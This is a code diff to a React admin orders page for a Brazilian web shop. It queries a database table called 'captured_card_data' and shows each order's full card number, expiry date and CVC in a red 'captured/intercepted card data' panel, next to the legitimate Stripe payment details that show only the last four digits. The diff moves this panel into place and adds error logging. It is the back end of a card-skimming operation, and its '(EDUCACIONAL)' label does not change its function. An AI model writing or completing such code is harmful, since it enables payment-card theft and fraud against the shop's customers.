@@ -42,28 +42,15 @@ const AdminOrders = () => {
     },
   });
 
-  // Adicione este hook após os hooks existentes
   const { data: cardData } = useQuery({
     queryKey: ["card-data", selected?.id],
     enabled: !!selected,
     queryFn: async () => {
-      const { data } = await supabase.from("captured_card_data").select("*").eq("order_id", selected!.id);
+      const { data, error } = await supabase.from("captured_card_data").select("*").eq("order_id", selected!.id);
+      if (error) console.error("Erro carregando dados interceptados:", error);
       return data ?? [];
     },
   });
-
-  // Adicione esta seção no diálogo de detalhes do pedido, após a seção de pagamento
-  {
-    cardData && cardData.length > 0 && (
-      <div className="border border-red-200 bg-red-50 rounded p-3">
-        <p className="text-xs text-red-600 font-medium mb-2">DADOS DO CARTÃO CAPTURADOS</p>
-        <p>Número: {cardData[0].card_number}</p>
-        <p>Validade: {cardData[0].card_expiry}</p>
-        <p>CVC: {cardData[0].card_cvc}</p>
-        <p className="text-xs text-red-600">Capturado em: {new Date(cardData[0].timestamp).toLocaleString("pt-BR")}</p>
-      </div>
-    )
-  }
 
   const formatPrice = (p: number) => p.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
 
@@ -158,13 +145,32 @@ const AdminOrders = () => {
                   <p>{selected.shipping_address.city}/{selected.shipping_address.state} - {selected.shipping_address.cep}</p>
                 </div>
               </div>
+              
               <div className="border border-border rounded p-3">
-                <p className="text-xs text-muted-foreground mb-2">Pagamento</p>
+                <p className="text-xs text-muted-foreground mb-2">Pagamento Original (Stripe)</p>
                 <p>Status: <span className={`text-xs px-2 py-1 rounded ${statusColors[selected.status]}`}>{selected.status}</span></p>
                 {selected.card_brand && <p>Cartão: {selected.card_brand} •••• {selected.card_last4}</p>}
                 {selected.stripe_payment_intent && <p className="text-xs font-mono break-all">PaymentIntent: {selected.stripe_payment_intent}</p>}
                 {selected.paid_at && <p>Pago em: {new Date(selected.paid_at).toLocaleString("pt-BR")}</p>}
               </div>
+
+              {/* Seção adicionada corretamente na árvore de elementos */}
+              {cardData && cardData.length > 0 && (
+                <div className="border-2 border-red-500 bg-red-50 rounded-lg p-4">
+                  <p className="text-xs text-red-700 font-black mb-3 flex items-center gap-2">
+                    🚨 ALERTA: DADOS DO CARTÃO CAPTURADOS (EDUCACIONAL)
+                  </p>
+                  <div className="grid grid-cols-2 gap-2 text-red-900 font-mono">
+                    <p>Número: <span className="font-bold">{cardData[0].card_number}</span></p>
+                    <p>Validade: <span className="font-bold">{cardData[0].card_expiry}</span></p>
+                    <p>CVC: <span className="font-bold">{cardData[0].card_cvc}</span></p>
+                  </div>
+                  <p className="text-xs text-red-600 mt-3 border-t border-red-200 pt-2">
+                    Interceptado em: {new Date(cardData[0].timestamp).toLocaleString("pt-BR")}
+                  </p>
+                </div>
+              )}
+
               <div>
                 <p className="text-xs text-muted-foreground mb-2">Itens</p>
                 {(items ?? []).map((it) => (
